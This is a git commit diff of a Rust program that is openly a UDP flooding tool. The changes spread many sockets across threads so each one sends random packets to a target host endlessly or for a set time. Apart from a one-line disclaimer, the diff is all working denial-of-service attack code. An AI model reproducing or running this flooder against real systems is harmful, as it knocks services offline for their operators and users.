a5156cd1cf2ffbbbf5634964dd1769e4ed4f322e
Daniel Matsumoto <insidetf2@gmail.com>
2020-09-07 01:41:57 -0300

    - Improved threads efficiency (multiple sockets per thread now) - Fixed minor bugs

--- src/main.rs
+++ src/main.rs
@@ -1,14 +1,12 @@
-use std::io::{Write};
-use std::net::{TcpStream, TcpListener, UdpSocket};
+use std::net::{UdpSocket};
 use std::env;
 use std::thread;
 use std::process::exit;
 use std::time;
-
+use rand::Rng;
 fn new_socket(host: &str, port: u32) -> UdpSocket{
 	let socket = UdpSocket::bind(format!("0.0.0.0:{}", port)).unwrap();
 	
-	println!("{}",host);
     socket.connect(host).unwrap();
 	return socket;
 }
@@ -23,28 +21,40 @@ fn main() {
     log("don't use this tool on any not allowed applications, please.");
     if args.len() > 2{
         log(&*format!("Starting attack against {}...", args[1]));
+
         let num_threads = args[2].to_string().parse::<i32>().unwrap();
         let time = args[3].to_string().parse::<u64>().unwrap();
         let host = args[1].to_string();
 		let mut port : u32 = 40000;
-        for _ in 1..num_threads {
-			port = port.clone() +  1;
+        log("Starting threads...");
+        for thread_num in 1..num_threads+1 {
+			port = port.clone() +  30;
             let host = format!("{}:{}", host.clone(), port);
             thread::spawn(move || {
-				println!("{}", port);
+                log(format!("Starting simulated attack on thread {}...", thread_num).as_str());
+                let mut port = port.clone() +  1;
+                let mut socket_list = Vec::new();
+                for _ in 1..20{
+                    port = port.clone() + 1;
+                    let socket = new_socket(host.as_str(), port);
+                    socket_list.push(socket);
+                }
 
-				let socket = new_socket(host.as_str(), port);
+                let msg = rand::thread_rng().gen::<[u8; 32]>();
                 loop{
-					let msg = "Que Ota?";
- 					socket.send(msg.as_bytes()).unwrap();
+                    for socket in &socket_list{
+                        socket.send(&msg).unwrap();
+                    }
+
                 }	
 
             });
 
+
         }
 
-		println!("All threads were created.");
-		if (time == 0){
+		log("All threads were created.");
+		if time == 0{
 			loop{}
 		}
 		else{
@@ -53,6 +63,6 @@ fn main() {
 		}
 	}
     else{
-        log(&*format!("{} ip:port number_of_threads time(0 for infinite)", args[0]))
+        log(&*format!("{} ip number_of_threads time(0 for infinite)", args[0]))
     }
 }	
